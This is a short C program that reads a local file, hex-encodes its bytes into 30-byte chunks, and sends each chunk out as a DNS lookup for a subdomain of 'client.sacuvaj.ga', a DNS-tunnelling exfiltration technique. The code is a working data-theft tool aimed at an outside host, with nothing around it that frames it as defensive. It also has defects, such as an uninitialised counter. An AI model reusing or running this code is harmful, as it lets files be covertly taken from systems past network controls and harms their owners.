#include<netdb.h>
#include<stdio.h>
#include<unistd.h>

#include "dns.h"

#define BUFFER_SIZE 256
unsigned char buffer[BUFFER_SIZE];

void sendfile(unsigned char*);

int main(){
	sendfile("simple.c");

	return 0;
}

void sendfile(unsigned char *file){
	get_dns_servers();

	unsigned char hostname[100] = "client.sacuvaj.ga";

	char request[100];

    char url[61];

	FILE * file_ptr = fopen (file, "r");

	int counter;

	size_t bytes_read = 0;

	int i;

	while(bytes_read = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, file_ptr)){
		for(i = 0; i < bytes_read; i++){
			sprintf(&url[counter%30*2], "%02X", buffer[i]);

			if(counter%30 == 29){
				sprintf(request, "%s.%s", url, hostname);
				ngethostbyname(request , 1);
				//sleep(1);
			}

			counter++;
		}
	}

	sprintf(request, "%s.%s", url, hostname);
	ngethostbyname(request , 1);

	return;
}